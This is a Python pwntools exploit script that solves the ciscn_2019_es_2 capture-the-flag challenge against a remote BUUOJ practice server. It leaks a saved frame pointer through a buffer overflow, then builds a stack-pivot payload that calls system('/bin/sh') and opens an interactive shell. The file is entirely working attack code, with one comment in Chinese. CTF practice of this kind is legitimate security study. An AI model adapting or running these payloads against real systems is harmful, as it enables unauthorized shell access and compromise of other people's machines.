# coding:utf-8
from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

#p = process('ciscn_2019_es_2')
p = remote('node3.buuoj.cn', 27651)
elf = ELF('ciscn_2019_es_2')

payload1 = 'a' * 0x20 + 'jjkkjjkk'
ret_addr = 0x08048562
system_addr = 0x08048400

p.recvuntil("name?")
p.send(payload1) #这里不能使用sendline，否则接收到\x0a程序会继续跑起来
p.recvuntil('jjkkjjkk')
fake_ebp = u32(p.recv(4))
print(hex(fake_ebp))

payload2 = 'a' * 4 + p32(system_addr) + p32(0xdeadbeef) + p32(fake_ebp - 0x28) + '/bin/sh'
payload2 = payload2.ljust(0x28, '\x00')
payload2 += p32(fake_ebp - 0x38) + p32(ret_addr)
p.send(payload2)

p.interactive()
